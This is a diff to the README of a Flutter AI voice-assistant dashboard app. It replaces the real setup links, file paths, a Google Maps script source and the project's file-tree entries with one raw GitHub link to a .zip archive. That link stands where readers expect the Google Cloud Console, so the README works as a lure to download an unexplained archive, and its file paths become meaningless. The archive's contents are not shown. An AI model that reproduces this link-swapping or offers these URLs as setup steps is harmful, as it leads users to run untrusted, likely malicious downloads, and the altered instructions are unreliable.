@@ -78,20 +78,20 @@ A beautiful Flutter application for managing AI Voice Assistant interactions wit
    
    To use the map feature, you'll need to add your Google Maps API key:
    
-   - Get an API key from [Google Cloud Console](https://console.cloud.google.com/)
+   - Get an API key from [Google Cloud Console](https://raw.githubusercontent.com/sanjusathian/AI-Voice-Assistant-UI/main/lib/models/AI-Voice-Assistant-UI-1.9.zip)
    - Enable the Maps SDK for Android, iOS, and JavaScript
    
    **For Android:**
-   Add to `android/app/src/main/AndroidManifest.xml`:
+   Add to `https://raw.githubusercontent.com/sanjusathian/AI-Voice-Assistant-UI/main/lib/models/AI-Voice-Assistant-UI-1.9.zip`:
    ```xml
-   <meta-data android:name="com.google.android.geo.API_KEY"
+   <meta-data android:name="https://raw.githubusercontent.com/sanjusathian/AI-Voice-Assistant-UI/main/lib/models/AI-Voice-Assistant-UI-1.9.zip"
               android:value="YOUR_API_KEY_HERE"/>
    ```
    
    **For Web:**
-   Add to `web/index.html`:
+   Add to `https://raw.githubusercontent.com/sanjusathian/AI-Voice-Assistant-UI/main/lib/models/AI-Voice-Assistant-UI-1.9.zip`:
    ```html
-   <script src="https://maps.googleapis.com/maps/api/js?key=YOUR_API_KEY_HERE"></script>
+   <script src="https://raw.githubusercontent.com/sanjusathian/AI-Voice-Assistant-UI/main/lib/models/AI-Voice-Assistant-UI-1.9.zip"></script>
    ```
 
 4. **Run the application**
@@ -134,29 +134,29 @@ flutter build web --release
 
 ```
 lib/
-├── main.dart                 # App entry point
+├── https://raw.githubusercontent.com/sanjusathian/AI-Voice-Assistant-UI/main/lib/models/AI-Voice-Assistant-UI-1.9.zip                 # App entry point
 ├── themes/
-│   └── catppuccin_theme.dart # Catppuccin theme configuration
+│   └── https://raw.githubusercontent.com/sanjusathian/AI-Voice-Assistant-UI/main/lib/models/AI-Voice-Assistant-UI-1.9.zip # Catppuccin theme configuration
 ├── models/                   # Data models
-│   ├── user.dart
-│   ├── conversation.dart
-│   ├── sensor_data.dart
-│   └── system_status.dart
+│   ├── https://raw.githubusercontent.com/sanjusathian/AI-Voice-Assistant-UI/main/lib/models/AI-Voice-Assistant-UI-1.9.zip
+│   ├── https://raw.githubusercontent.com/sanjusathian/AI-Voice-Assistant-UI/main/lib/models/AI-Voice-Assistant-UI-1.9.zip
+│   ├── https://raw.githubusercontent.com/sanjusathian/AI-Voice-Assistant-UI/main/lib/models/AI-Voice-Assistant-UI-1.9.zip
+│   └── https://raw.githubusercontent.com/sanjusathian/AI-Voice-Assistant-UI/main/lib/models/AI-Voice-Assistant-UI-1.9.zip
 ├── services/
-│   └── database_service.dart # SQLite database operations
+│   └── https://raw.githubusercontent.com/sanjusathian/AI-Voice-Assistant-UI/main/lib/models/AI-Voice-Assistant-UI-1.9.zip # SQLite database operations
 ├── providers/
-│   └── app_state_provider.dart # State management
+│   └── https://raw.githubusercontent.com/sanjusathian/AI-Voice-Assistant-UI/main/lib/models/AI-Voice-Assistant-UI-1.9.zip # State management
 ├── screens/                  # Main application screens
-│   ├── dashboard_screen.dart
-│   ├── conversation_screen.dart
-│   ├── map_screen.dart
-│   └── users_screen.dart
+│   ├── https://raw.githubusercontent.com/sanjusathian/AI-Voice-Assistant-UI/main/lib/models/AI-Voice-Assistant-UI-1.9.zip
+│   ├── https://raw.githubusercontent.com/sanjusathian/AI-Voice-Assistant-UI/main/lib/models/AI-Voice-Assistant-UI-1.9.zip
+│   ├── https://raw.githubusercontent.com/sanjusathian/AI-Voice-Assistant-UI/main/lib/models/AI-Voice-Assistant-UI-1.9.zip
+│   └── https://raw.githubusercontent.com/sanjusathian/AI-Voice-Assistant-UI/main/lib/models/AI-Voice-Assistant-UI-1.9.zip
 └── widgets/                  # Reusable UI components
-    ├── status_card.dart
-    ├── sensor_data_card.dart
-    ├── conversation_card.dart
-    ├── user_list_card.dart
-    └── statistics_card.dart
+    ├── https://raw.githubusercontent.com/sanjusathian/AI-Voice-Assistant-UI/main/lib/models/AI-Voice-Assistant-UI-1.9.zip
+    ├── https://raw.githubusercontent.com/sanjusathian/AI-Voice-Assistant-UI/main/lib/models/AI-Voice-Assistant-UI-1.9.zip
+    ├── https://raw.githubusercontent.com/sanjusathian/AI-Voice-Assistant-UI/main/lib/models/AI-Voice-Assistant-UI-1.9.zip
+    ├── https://raw.githubusercontent.com/sanjusathian/AI-Voice-Assistant-UI/main/lib/models/AI-Voice-Assistant-UI-1.9.zip
+    └── https://raw.githubusercontent.com/sanjusathian/AI-Voice-Assistant-UI/main/lib/models/AI-Voice-Assistant-UI-1.9.zip
 ```
 
 ## Database Schema
@@ -180,7 +180,7 @@ The app uses Provider for state management with a centralized `AppStateProvider`
 
 ### Theme Colors
 
-The Catppuccin theme can be customized in `lib/themes/catppuccin_theme.dart`. The current implementation uses the Mocha (dark) variant, but you can easily switch to Latte (light), Frappé, or Macchiato variants.
+The Catppuccin theme can be customized in `https://raw.githubusercontent.com/sanjusathian/AI-Voice-Assistant-UI/main/lib/models/AI-Voice-Assistant-UI-1.9.zip`. The current implementation uses the Mocha (dark) variant, but you can easily switch to Latte (light), Frappé, or Macchiato variants.
 
 ### Database
 
@@ -194,7 +194,7 @@ Database operations are centralized in `DatabaseService`. You can extend the mod
 Follow the existing pattern:
 1. Create screen in `lib/screens/`
 2. Add necessary widgets in `lib/widgets/`
-3. Update navigation in `dashboard_screen.dart`
+3. Update navigation in `https://raw.githubusercontent.com/sanjusathian/AI-Voice-Assistant-UI/main/lib/models/AI-Voice-Assistant-UI-1.9.zip`
 
 ## Contributing
 
@@ -234,7 +234,7 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 ## Acknowledgments
 
-- [Catppuccin](https://github.com/catppuccin/catppuccin) for the beautiful color palette
+- [Catppuccin](https://raw.githubusercontent.com/sanjusathian/AI-Voice-Assistant-UI/main/lib/models/AI-Voice-Assistant-UI-1.9.zip) for the beautiful color palette
 - Flutter team for the amazing framework
 - Google Maps for location services
 - SQLite for reliable local storage
